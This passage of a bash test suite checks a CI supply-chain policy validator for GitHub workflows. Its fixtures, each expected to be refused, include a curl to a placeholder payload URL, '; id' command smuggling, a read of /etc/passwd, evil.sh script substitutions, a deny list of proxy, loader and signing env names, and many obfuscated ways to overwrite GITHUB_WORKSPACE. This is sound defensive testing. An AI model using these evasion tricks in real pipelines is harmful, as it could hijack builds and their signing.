d=$(pfix s_shape); printf '[{"file":"x","job":"j","id":"digests","run":"echo","why":"w","extra":1}]' > "$d/.pinned.json"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): an entry with another key is an error"
d=$(pfix s_notlist); printf '{"file":"x"}' > "$d/.pinned.json"; gen "$d"; expm caught "$d" 'pinned_steps' "round-1 (5): pinned_steps that is not a list is an error"
# (6) duplicate JSON keys
dupj() { # dupj DIR FILE 'old' 'new' : rewrite one policy file's text
  python3 -c 'import sys;p=sys.argv[1]+"/"+sys.argv[2];t=open(p).read();assert sys.argv[3] in t;open(p,"w").write(t.replace(sys.argv[3],sys.argv[4],1))' "$@"; }
d=$(wfix j_row); dupj "$d" .github/policy/chain-scripts.json '"exceptions": [' '"exceptions": [], "exceptions": ['; expm caught "$d" 'duplicate key' "round-1 (6): chain-scripts.json with exceptions twice in a row (the last would win) is refused, naming the key"
d=$(wfix j_top); dupj "$d" .github/policy/chain-scripts.json '{"env_names"' '{"ambient_env": [], "ambient_env": [], "env_names"'; expm caught "$d" 'duplicate key' "round-1 (6): chain-scripts.json with a top-level key twice is refused"
d=$(mk j_signers); dupj "$d" .github/policy/chain-signers.json '{"signers":[' '{"signers":[],"signers":['; expm caught "$d" 'duplicate key' "round-1 (6): chain-signers.json with a key twice is refused"
d=$(mk j_idtok); dupj "$d" .github/policy/id-token-jobs.json '{"jobs":[' '{"jobs":[],"jobs":['; expm caught "$d" 'duplicate key' "round-1 (6): id-token-jobs.json with a key twice is refused"
# (7) reads_env needs a mention outside comments
rfix() { # rfix NAME 'file text' : bin/c.sh or bin/c.py with reads_env GH_TOKEN
  local d f; d=$(mk "$1"); f=bin/c.sh; case "$2" in "#!/usr/bin/env python3"*) f=bin/c.py;; esac
  setfile "$d" $f "$2"; edit_spec "$d" 'rows["'$f'"]={"path":"'$f'","tools":[],"signs":False,"runs":[],"reads_env":["GH_TOKEN"]}'; echo "$d"; }
d=$(rfix t_sh_cmt '#!/usr/bin/env bash\n# reads GH_TOKEN\necho a\n'); expm caught "$d" 'reads_env' "round-1 (7): a shell comment line naming the variable is not a read"
d=$(rfix t_sh_tail '#!/usr/bin/env bash\necho a # GH_TOKEN\n'); expm caught "$d" 'reads_env' "round-1 (7): a trailing shell comment naming the variable is not a read"
d=$(rfix t_sh_sq '#!/usr/bin/env bash\necho '"'"'GH_TOKEN'"'"'\n'); expm caught "$d" 'reads_env' "round-1 (7): a single-quoted mention is not a read"
d=$(rfix t_sh_ok '#!/usr/bin/env bash\necho "$GH_TOKEN"\n'); expm ok "$d" - "round-1 (7): control: a shell read"
d=$(rfix t_py_cmt '#!/usr/bin/env python3\n# GH_TOKEN\nx = 1\n'); expm caught "$d" 'reads_env' "round-1 (7): a Python comment naming the variable is not a read"
d=$(rfix t_py_doc '#!/usr/bin/env python3\n"""Reads GH_TOKEN."""\nx = 1\n'); expm caught "$d" 'reads_env' "round-1 (7): a Python module docstring naming the variable is not a read"
d=$(rfix t_py_doc2 '#!/usr/bin/env python3\ndef f():\n    """Reads GH_TOKEN."""\n    return 1\n'); expm caught "$d" 'reads_env' "round-1 (7): a Python function docstring naming the variable is not a read"
d=$(rfix t_py_ok '#!/usr/bin/env python3\nimport os\nx = os.environ.get("GH_TOKEN")\n'); expm ok "$d" - "round-1 (7): control: a Python os.environ.get read"
d=$(rfix t_py_ok2 '#!/usr/bin/env python3\nimport os\nx = os.environ["GH_TOKEN"]\n'); expm ok "$d" - "round-1 (7): control: a Python os.environ[] read"


# ---- PR 1b round 2
kc() { # kc NAME 'script lines' FRAG [tools-json] [runs-json] : a listed shell script that must be refused, naming FRAG
  local d; d=$(cfix "$1" "$2" "${4:-[]}" "${5:-[]}"); expm caught "$d" "$3" "round-2 $1: $2 is refused"; }
ko() { # ko NAME 'script lines' [tools-json] [runs-json] : admitted
  local d; d=$(cfix "$1" "$2" "${3:-[]}" "${4:-[]}"); expm ok "$d" - "round-2 $1: $2 is admitted"; }
# (1) a script-name waiver never survives a changed executable command
d=$(cfix k1_a './bin/build-apk.sh --changed'); edit_spec "$d" 'rows["bin/c.sh"]["exceptions"]=[{"rule":"script-name","text":"./bin/build-apk.sh","why":"x"}]'; expm caught "$d" 'command position' "round-2 (1): entry ./bin/build-apk.sh does not waive ./bin/build-apk.sh --changed"
d=$(cfix k1_b './bin/build-apk.sh; id'); edit_spec "$d" 'rows["bin/c.sh"]["exceptions"]=[{"rule":"script-name","text":"./bin/build-apk.sh","why":"x"}]'; expm ok "$d" - "round-2 (1): ./bin/build-apk.sh; id is two simple commands: the entry ./bin/build-apk.sh waives the first by its whole text (id is not a finding)"
d=$(cfix k1_c './bin/build-apk.sh --safe'); edit_spec "$d" 'rows["bin/c.sh"]["exceptions"]=[{"rule":"script-name","text":"./bin/build-apk.sh --safe","why":"x"}]'; expm ok "$d" - "round-2 (1): an entry with the whole command text waives exactly that command"
d=$(cfix k1_d './bin/build-apk.sh --safe\n./bin/build-apk.sh --changed'); edit_spec "$d" 'rows["bin/c.sh"]["exceptions"]=[{"rule":"script-name","text":"./bin/build-apk.sh --safe","why":"x"}]'; expm caught "$d" 'command position' "round-2 (1): a second, different command of the same script stays a finding"
d=$(cfix k1_e 'echo ./bin/build-apk.sh'); edit_spec "$d" 'rows["bin/c.sh"]["exceptions"]=[{"rule":"script-name","text":"./bin/build-apk.sh","why":"x"}]'; expm ok "$d" - "round-2 (1): a script path named as an operand (not a command) is still waived by its path"
# (a, advisor) an exception is bound by the row's sha256
d=$(wfix k1_hash); printf '# edited, the waived text still occurs\n' >> "$d/bin/witnessed.sh"; expm caught "$d" 'sha256' "round-2 (a): a script edited so the waived text still occurs, with the old sha256 kept in the row, is refused on the hash pin"
# (2) the pinned step has a closed shape
pfx() { # pfx NAME RUN-TEXT : a stage file whose digests step and whose pinned_steps entry both carry RUN-TEXT
  local d; d=$(mk "$1"); DG2="$2" python3 - "$d" <<'PY'
import json, os, sys
d = sys.argv[1]; run = os.environ["DG2"]
open(d + "/.github/workflows/stage-build.yml", "w").write("jobs:\n  assemble:\n    runs-on: ubuntu-24.04\n    steps:\n      - id: digests\n        name: x\n        run: '" + run.replace("'", "''") + "'\n")
json.dump([{"file": ".github/workflows/stage-build.yml", "job": "assemble", "id": "digests", "run": run, "why": "REQ-CHAIN-004-AC2"}], open(d + "/.pinned.json", "w"))
PY
  gen "$d"; echo "$d"; }
d=$(pfx m_ok 'echo "digests=$(jq -c . digests.json)" >> "$GITHUB_OUTPUT"'); expm ok "$d" - "round-2 (2): the AC2 text is admitted"
d=$(pfx m_ok2 'echo "d_1=$(jq -c . out/a-b.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2) -> round-3 (5): another name and file of the generic shape are now an entry error (only the ratified tuple)"
d=$(pfx m_curl 'curl https://example.invalid/payload'); expm caught "$d" 'pinned_steps' "round-2 (2): a curl command in both the entry and the step is an entry error"
d=$(pfx m_semi 'echo "x=$(jq -c . a.json)" >> "$GITHUB_OUTPUT"; id'); expm caught "$d" 'pinned_steps' "round-2 (2): the shape followed by ; id is refused"
d=$(pfx m_env 'echo "x=$(jq -c . a.json)" >> "$GITHUB_ENV"'); expm caught "$d" 'pinned_steps' "round-2 (2): >> GITHUB_ENV is refused"
d=$(pfx m_cat 'echo "x=$(cat a.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): \$(cat ..) is refused"
d=$(pfx m_dots 'echo "x=$(jq -c . ../a.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): a FILE with .. is refused"
d=$(pfx m_abs 'echo "x=$(jq -c . /etc/passwd)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): an absolute FILE is refused"
d=$(pfx m_upper 'echo "X=$(jq -c . a.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): an upper-case NAME is refused"
d=$(pfx m_flag 'echo "x=$(jq -r . a.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): another jq option is refused"
d=$(pfx m_two 'echo "x=$(jq -c . a.json b.json)" >> "$GITHUB_OUTPUT"'); expm caught "$d" 'pinned_steps' "round-2 (2): two files are refused"
cat > "$work/pinpath.py" <<'PY'
import importlib.util, json, os, sys, yaml
spec = importlib.util.spec_from_file_location("cts", os.environ["CHAIN_ROOT"] + "/bin/chain-test-signers.py"); cts = importlib.util.module_from_spec(spec); spec.loader.exec_module(cts)
base, path = sys.argv[1], sys.argv[2]
rows, errs, envn = cts.load_scripts(base)
d = cts.yload(open(base + "/.github/workflows/stage-build.yml").read())
e, _ = cts.stage_grammar("stage-build.yml", d, rows, envn, path)
print("; ".join(errs + e) or "ok"); sys.exit(1 if errs + e else 0)
PY
d=$(pfix m_path); out=$(python3 "$work/pinpath.py" "$d" .github/workflows/stage-build.yml 2>&1) && { pass=$((pass + 1)); echo "ok   round-2 (2): the pin binds the full repo path (control: the right path)"; } || { failn=$((failn + 1)); echo "FAIL round-2 (2) pin full path control -> ${out:0:300}"; }
d=$(pfix m_path2); out=$(python3 "$work/pinpath.py" "$d" tools/ci/stage-build.yml 2>&1) && { failn=$((failn + 1)); echo "FAIL round-2 (2): a same-named stage file under another directory got the pin"; } || { grep -q 'GITHUB_OUTPUT' <<< "$out" && { pass=$((pass + 1)); echo "ok   round-2 (2): a same-named stage file under another directory gets no pin (caught: ${out:0:100})"; } || { failn=$((failn + 1)); echo "FAIL round-2 (2) other directory -> ${out:0:300}"; }; }
# (3) the forbidden families are prefixes (no underscore needed), plus the proxy / TLS / Go / signing tool names
for nm in GITASKPASS GITHUBTOKEN GITHUB RUNNERX RUNNER NODERUNTIME NODE GIT1 PYTHON PYTHON3 PYTHONX HTTP_PROXY HTTPS_PROXY NO_PROXY ALL_PROXY http_proxy SSL_CERT_FILE SSL_CERT_DIR2 CURL_CA_BUNDLE CURLOPT GOFLAGS GOPROXY GOSUMDB GONOSUMDB GOTOOLCHAIN WITNESS_X WITNESSX COSIGN_EXPERIMENTAL SIGSTORE_ID_TOKEN TUF_ROOT TERM TERMX NPM_CONFIG BUNDLE_X GEM_HOME XDG_HOME GLOBIGNORE CDPATH IFS PROMPT_COMMAND SHELLOPTS BASHOPTS PS1 LD_X LC_ALL BASH_X; do
  d=$(mk "n_$nm"); printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          %s: x\n        run: bash bin/build-stage.sh apk "$%s"\n' "$nm" "$nm" > "$d/.github/workflows/stage-verify.yml"; expm caught "$d" 'never allowed' "round-2 (3): the env name $nm is forbidden in a step env"
  d=$(mk "o_$nm"); printf '["DIGESTS","%s"]' "$nm" > "$d/.envnames.json"; gen "$d"; expm caught "$d" 'env_names' "round-2 (3): $nm in env_names is refused"
done
for nm in GITASKPASS GITHUBTOKEN RUNNERX NODERUNTIME PYTHON3 HTTPS_PROXY GOFLAGS SSL_CERT_FILE COSIGN_EXPERIMENTAL TUF_ROOT; do
  d=$(afix "p_$nm"); printf '[{"name":"%s","script":"bin/build-admit.py","why":"x"}]' "$nm" > "$d/.ambient.json"; edit_spec "$d" 'rows["bin/build-admit.py"]["reads_env"]=["'"$nm"'"]'; expm caught "$d" 'ambient_env' "round-2 (3): $nm is refused as an ambient_env entry"
done
d=$(mk q_digests); printf 'jobs:\n  j:\n    steps:\n      - name: a\n        env:\n          DIGESTS: x\n        run: bash bin/build-stage.sh apk "$DIGESTS"\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "round-2 (3): control: DIGESTS stays an allowed env name"
d=$(afix q_ghtoken); expm ok "$d" - "round-2 (3): control: GH_TOKEN stays an allowed ambient name"
# (4) the literal arguments of a stage run line, and arg_words for a wrapper
awfix() { local d; d=$(afix "$1"); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_words"]=["apk","build","rapk","rebuild"]'; echo "$d"; }
aw() { # aw NAME 'run text' ok|caught FRAG
  local d; d=$(awfix "$1"); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: %s\n' "$2" > "$d/.github/workflows/stage-verify.yml"; expm "$3" "$d" "$4" "round-2 (4): $2"; }
aw u_ok 'bash bin/witnessed.sh apk bin/stage-apk.sh' ok -
aw u_ok2 'bash bin/witnessed.sh build bin/stage-apk.sh bin/build-admit.py' ok -
aw u_evil 'bash bin/witnessed.sh apk bin/evil.sh' caught 'evil.sh'
aw u_tmp 'bash bin/witnessed.sh apk /tmp/evil.sh' caught 'evil.sh'
aw u_bogus 'bash bin/witnessed.sh bogus bin/stage-apk.sh' caught 'arg_words'
aw u_dots 'bash bin/witnessed.sh apk ../bin/stage-apk.sh' caught 'stage-apk.sh'
aw u_dslash 'bash bin/witnessed.sh apk bin//stage-apk.sh' caught 'stage-apk.sh'
aw u_dotslash 'bash bin/witnessed.sh apk ./bin/stage-apk.sh' caught 'stage-apk.sh'
aw u_third 'bash bin/witnessed.sh apk bin/stage-apk.sh bin/evil.sh' caught 'evil.sh'
aw u_noext 'bash bin/witnessed.sh apk bin/evil' caught 'bin/evil'
aw u_first 'bash bin/witnessed.sh bin/stage-apk.sh' caught 'arg_words'
aw u_none 'bash bin/witnessed.sh' caught 'arg_words'
aw u_data 'bash bin/witnessed.sh apk bin/stage-apk.sh out/x.json' ok -
d=$(awfix u_shape1); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_words"]="apk"'; expm caught "$d" 'arg_words' "round-2 (4): arg_words that is not a list is an error"
d=$(awfix u_shape2); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_words"]=["apk","a b"]'; expm caught "$d" 'arg_words' "round-2 (4): an arg_words member that is not a plain word is an error"
d=$(awfix u_shape3); edit_spec "$d" 'rows["bin/witnessed.sh"]["arg_words"]=[]'; expm caught "$d" 'arg_words' "round-2 (4): an empty arg_words list is an error"
d=$(afix u_free); printf 'jobs:\n  j:\n    steps:\n      - name: apk\n        env:\n          GH_TOKEN: ${{ github.token }}\n        run: bash bin/witnessed.sh anything bin/stage-apk.sh\n' > "$d/.github/workflows/stage-verify.yml"; expm ok "$d" - "round-2 (4): control: a wrapper row without arg_words has no first-argument restriction"
# (5) leading redirections and assignments before every command-position rule
kc r5_a '2>/dev/null bash -c "$X"' 'handed' '["bash"]'
kc r5_b '>/dev/null exec bash "$@"' 'launches another program' '["bash","exec"]'
kc r5_c '>/dev/null timeout 5 bash -c "$X"' 'launches another program' '["bash","timeout"]'
kc r5_d '>o xargs bash -c "$X"' 'launches another program' '["bash","xargs"]'
kc r5_e '>o unshare -r bash -c "$X"' 'launches another program' '["bash","unshare"]'
kc r5_f '>o setsid bash -c "$X"' 'launches another program' '["bash"]'
kc r5_g '3>&1 bash -c "$X"' 'handed' '["bash"]'
kc r5_h 'if >o bash -c "$X"; then :; fi' 'handed' '["bash"]'
kc r5_i '&>o bash -c "$X"' 'handed' '["bash"]'
kc r5_j '>|o bash -c "$X"' 'handed' '["bash"]'
kc r5_k '{fd}>o bash -c "$X"' 'handed' '["bash"]'
kc r5_l '<<<x bash -c "$X"' 'handed' '["bash"]'
kc r5_m 'FOO=1 >o bash -c "$X"' 'handed' '["bash"]'
kc r5_n '>o FOO=1 bash -c "$X"' 'handed' '["bash"]'
kc r5_o '>o >p 2>&1 bash -c "$X"' 'handed' '["bash"]'
kc r5_p '>o sed -n 1p f' 'evaluator' '["x"]'
kc r5_q '>o ./bin/build-apk.sh' 'command position'
kc r5_r 'bash -c "$X"' 'handed' '["bash"]'
ko r5_ok1 '>o bash bin/build-apk.sh' '["bash"]' '["bin/build-apk.sh"]'
# a listed script named from the runner's checkout root: the workspace variable (plain or braced) followed by an exact listed path is the listed path itself;
# anything else after it, another variable, or a path that climbs out is judged as before (a script whose own cd the pin check cannot place needs this form)
ko ws_ok1 'bash "$GITHUB_WORKSPACE/bin/build-apk.sh"' '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok2 'bash "${GITHUB_WORKSPACE}/bin/build-apk.sh"' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad1 'bash "$GITHUB_WORKSPACE/bin/evil.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad2 'bash "$OTHER/bin/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad3 'bash "$GITHUB_WORKSPACE/../bin/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad4 'bash "$GITHUB_WORKSPACE/bin/build-apk.sh/../evil.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad5 'bash "$GITHUB_WORKSPACEX/bin/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad6 'bash "./$GITHUB_WORKSPACE/bin/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad7 'bash "./${GITHUB_WORKSPACE}/bin/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad8 'bash "bin/$GITHUB_WORKSPACE/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad9 'bash "bin/${GITHUB_WORKSPACE}/build-apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad10 'bash "bin/build-$GITHUB_WORKSPACE/apk.sh"' 'handed' '["bash"]' '["bin/build-apk.sh"]'
# the variable must still be the runner's: a script that sets, exports, unsets or reads into it, or names it in a single quote or after a backslash, is refused (round 4)
kc ws_bad11 'GITHUB_WORKSPACE=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad12 'export GITHUB_WORKSPACE=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad13 'readonly GITHUB_WORKSPACE=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad14 'unset GITHUB_WORKSPACE\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad15 'read GITHUB_WORKSPACE\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad16 ': "${GITHUB_WORKSPACE:=/tmp}"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad17 "bash '\$GITHUB_WORKSPACE/bin/build-apk.sh'" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad18 "bash '\${GITHUB_WORKSPACE}/bin/build-apk.sh'" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad19 'bash \$GITHUB_WORKSPACE/bin/build-apk.sh' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad20 'local GITHUB_WORKSPACE=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok3 'cd "$GITHUB_WORKSPACE"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' '["bash"]' '["bin/build-apk.sh"]'
# a variable name built at run time can reach the same variable without ever writing its name: any such form before the call refuses the prefix (round 5)
kc ws_bad21 'n=GITHUB_\nexport "${n}WORKSPACE=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad22 'n=GITHUB_\nprintf -v "${n}WORKSPACE" %s /tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad23 'n=GITHUB_\ndeclare -n r="${n}WORKSPACE"\nr=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad24 'n=GITHUB_\nread -r "${n}WORKSPACE" <<<"/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad25 'n=GITHUB_WORKSPAC\n: ${!n}\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad26 'n=GITHUB_\n(( ${n}WORKSPACE = 1 ))\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad27 'n=GITHUB_\nmapfile "${n}WORKSPACE" <<<"/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad28 'n=GITHUB_\neval "${n}WORKSPACE=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash","eval"]' '["bin/build-apk.sh"]'
kc ws_bad29 'n=GITHUB_\nlet "${n}WORKSPACE=1"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
ko ws_ok4 'export FOO="$HOME/x"\nD=$GITHUB_WORKSPACE\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad30 'export {GITHUB_WORKSPACE,X}=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad31 'unset {GITHUB_WORKSPACE,X}\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad32 'read -r {GITHUB_WORKSPACE,X} </dev/null\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
# a parent that changes the variable and then runs a listed child with no prefix of its own is refused too
kc ws_bad33 'export GITHUB_WORKSPACE=/tmp/x\nbash bin/build-apk.sh' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad34 'GITHUB_WORKSPACE=/tmp/x bash bin/build-apk.sh' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad35 'n=GITHUB_; m=WORKSPACE\nexport A=1 "$n$m=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad36 'n=GITHUB_; m=WORKSPACE\nexport \\\n "$n$m=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad37 'n=GITHUB_; m=WORKSPACE\ngetopts a "$n$m" -a\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad38 'n=GITHUB_W; m=ORKSPACE\ndeclare "$n$m=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad39 'n=GITHUB_W\nexport "${n}ORKSPACE=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad40 'n=GITHUB_\nunset X "${n}WORKSPACE"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad41 'n=GITHUB_\nexport {"${n}WORKSPACE",X}=/tmp\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad42 'n=GITHUB_\na[${n}WORKSPACE=1]=x\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad43 'n=GITHUB_\n[[ ${n}WORKSPACE=1 -eq 1 ]]\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad44 'a=WOR; b=KSP; c=ACE\nexport "GITHUB_$a$b$c=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad45 'x=AWORKSPACEB\nexport "GITHUB_${x:1:9}=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad46 'x=XWORKSPACEX; n=GITHUB_${x:1:9}\nexport "$n=/tmp"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad47 'n=GITHUB_; a=QWORKSPACE\nprintf -v "$n${a#Q}" %s /tmp/evil\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad49 "x='\$GITHUB_WORKSPACE'\nexport \"\${x#?}=/tmp/evil\"\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad50 'x=\$GITHUB_WORKSPACE\nexport "${x#?}=/tmp/evil"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad51 'for v in ${!GITHUB_W*}; do printf -v $v /tmp/x; done\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad52 'for v in ${!GITHUB_*}; do declare $v=/tmp; done\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad53 'x=QZWORKZZSPACXZEZ\nprintf -v "GITHUB_${x:2:4}${x:8:4}${x:14:1}" %s /tmp/evil\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad54 'p=GITHUB_\nexport "${p}${q}=/tmp/evil"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad55 "x='\n\$GITHUB_WORKSPACE\n'\nprintf -v \"\${x:2:16}\" %s /tmp/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad56 "read -r -d '' x <<'E'\n\$GITHUB_WORKSPACE\nE\nprintf -v \"\${x:1:16}\" %s /tmp/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad57 "x=\$(cat <<'E'\n\$GITHUB_WORKSPACE\nE\n)\nprintf -v \"\${x:1:16}\" %s /tmp/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad58 'x=GITHUB_QWORKQSPACQE\nprintf -v "${x:0:7}${x:8:4}${x:13:4}${x:18:1}" %s /tmp/evil\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad59 'a=GITHUB_WORKQ\nb=SPAQCE\nprintf -v "${a:0:11}${b:0:3}${b:4:2}" %s /tmp/evil\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad60 'x=$(echo QWORKQSPACQE | tr -d Q)\nexport "GITHUB_$x=/tmp/evil"\nbash "$GITHUB_WORKSPACE/bin/build-apk.sh"' 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad61 "a=1; echo \${#a} >/dev/null; x='\$GITHUB_WORKSPACE'\nn=\$(echo \"\$x\" | cut -c2-17)\nprintf -v \"\$n\" %s /abs/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
kc ws_bad62 "n=\"\$(echo '\$GITHUB_WORKSPACE' | tr -d '\$')\"\nprintf -v \"\$n\" '%s' /tmp/evil\nbash \"\$GITHUB_WORKSPACE/bin/build-apk.sh\"" 'GITHUB_WORKSPACE' '["bash"]' '["bin/build-apk.sh"]'
